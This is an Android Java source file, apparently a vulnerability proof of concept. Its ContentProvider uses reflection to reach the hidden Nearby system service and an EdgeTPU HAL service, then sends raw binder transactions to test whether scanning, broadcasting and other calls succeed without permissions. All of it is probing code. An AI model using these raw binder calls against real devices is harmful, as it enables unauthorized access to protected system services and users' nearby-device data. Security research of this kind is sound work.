package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public class NearbyLeakProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        IBinder binder = getServiceBinder("nearby");
        if (binder == null) {
            cursor.addRow(new Object[]{"error", "no_binder"});
            return cursor;
        }

        String desc = "android.nearby.INearbyManager";

        // Test registerScanListener with our package name
        testRegisterScan(binder, desc, cursor);

        // Test all other TX codes
        testAllTx(binder, desc, cursor);

        // Also test EdgeTPU from app context
        testEdgeTPU(cursor);

        return cursor;
    }

    private void testRegisterScan(IBinder binder, String desc, MatrixCursor cursor) {
        final AtomicReference<String> cbResult = new AtomicReference<>("no_callback");
        final CountDownLatch latch = new CountDownLatch(1);

        IBinder scanCallback = new android.os.Binder() {
            @Override
            protected boolean onTransact(int code, Parcel d, Parcel r, int flags) {
                cbResult.set("scan_callback! code=" + code + " dataSize=" + d.dataSize());
                latch.countDown();
                if (r != null) r.writeNoException();
                return true;
            }
            @Override
            public String getInterfaceDescriptor() {
                return "android.nearby.IScanListener";
            }
        };

        // TX=1: registerScanListener(ScanRequest, IScanListener, String callingPackage, String callingFeatureId)
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            // ScanRequest parcelable
            data.writeInt(1); // non-null
            data.writeInt(1); // scanType (SCAN_TYPE_NEARBY_PRESENCE = 1)
            data.writeInt(0); // empty list of ScanFilter
            data.writeInt(0); // work source (null)
            data.writeInt(0); // scan mode

            // IScanListener
            data.writeStrongBinder(scanCallback);

            // callingPackage
            data.writeString(getContext().getPackageName());
            // callingFeatureId (attributionTag)
            data.writeString(null);

            binder.transact(1, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"registerScan", "SUCCESS! No permission needed!"});
                // Wait for callback
                boolean got = latch.await(3, TimeUnit.SECONDS);
                cursor.addRow(new Object[]{"scanCallback", got ? cbResult.get() : "timeout(3s)"});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"registerScan", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"registerScan", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=2: unregisterScanListener (probably needs the same listener)
        // TX=3: startBroadcast
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            // BroadcastRequest parcelable
            data.writeInt(1); // non-null
            data.writeInt(1); // broadcastType
            data.writeInt(0); // empty list
            data.writeInt(0); // medium

            // IBroadcastListener
            data.writeStrongBinder(new android.os.Binder());
            // callingPackage
            data.writeString(getContext().getPackageName());
            data.writeString(null);

            binder.transact(3, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"startBroadcast", "SUCCESS! No permission needed!"});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"startBroadcast", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"startBroadcast", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();
    }

    private void testAllTx(IBinder binder, String desc, MatrixCursor cursor) {
        // TX=6,7 returned SUCCESS, TX=8 returned SUCCESS with data
        for (int tx = 4; tx <= 12; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (!result) {
                    cursor.addRow(new Object[]{"nearby_tx" + tx, "NO_SUCH_TX"});
                } else {
                    int ex = reply.readInt();
                    if (ex == 0) {
                        int avail = reply.dataAvail();
                        cursor.addRow(new Object[]{"nearby_tx" + tx, "SUCCESS avail=" + avail});
                    } else {
                        String msg = reply.readString();
                        cursor.addRow(new Object[]{"nearby_tx" + tx, "Ex=" + ex + "|" + truncate(msg)});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"nearby_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testEdgeTPU(MatrixCursor cursor) {
        // Test EdgeTPU from app context
        IBinder binder = getServiceBinder("com.google.edgetpu.IEdgeTpuAppService/default");
        if (binder == null) {
            cursor.addRow(new Object[]{"edgetpu", "NOT_ACCESSIBLE"});
            return;
        }
        cursor.addRow(new Object[]{"edgetpu", "ACCESSIBLE!"});
        String desc = "com.google.edgetpu.IEdgeTpuAppService";

        // TX=3 returned version info from shell, TX=4 also
        for (int tx = 1; tx <= 5; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(0);
                binder.transact(tx, data, reply, 0);
                // HAL services don't use standard exception format
                int avail = reply.dataAvail();
                if (avail > 0) {
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < Math.min(avail / 4, 10); i++) {
                        sb.append(reply.readInt()).append(" ");
                    }
                    cursor.addRow(new Object[]{"edgetpu_tx" + tx, "data=" + sb.toString().trim()});
                } else {
                    cursor.addRow(new Object[]{"edgetpu_tx" + tx, "empty"});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"edgetpu_tx" + tx, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
